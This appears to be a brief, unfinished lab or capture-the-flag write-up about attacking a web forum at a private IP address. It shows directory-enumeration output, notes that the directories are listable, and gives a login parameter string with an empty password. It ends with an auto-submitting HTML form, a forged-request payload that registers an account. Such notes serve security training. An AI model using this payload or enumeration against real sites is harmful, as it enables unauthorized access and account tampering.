# Exploit the Forum

The forum can be access throught this URI: https://192.168.1.120:443/forum/

![img forum](/img/forum.png)

```bash
==> DIRECTORY: https://192.168.1.120:443/forum/

---- Entering directory: https://192.168.1.120:443/forum/ ----
==> DIRECTORY: https://192.168.1.120:443/forum/js/
==> DIRECTORY: https://192.168.1.120:443/forum/includes/
==> DIRECTORY: https://192.168.1.120:443/forum/js/
==> DIRECTORY: https://192.168.1.120:443/forum/lang/ 
==> DIRECTORY: https://192.168.1.120:443/forum/modules/
==> DIRECTORY: https://192.168.1.120:443/forum/templates_c/
==> DIRECTORY: https://192.168.1.120:443/forum/themes/
==> DIRECTORY: https://192.168.1.120:443/forum/update/
```

All of this directories are listable: 

![img listable](/img/index-js.png)

https://192.168.1.120/forum/index.php?mode=register

mode=login&username=test&userpw=""

<form action="https://192.168.1.120/forum/index.php?mode=register" method="POST">
    <input type="hidden" name="username" value="test" />
    <input type="hidden" name="userpw" value="test" />
</form>
<script>
    document.forms[0].submit();
</script>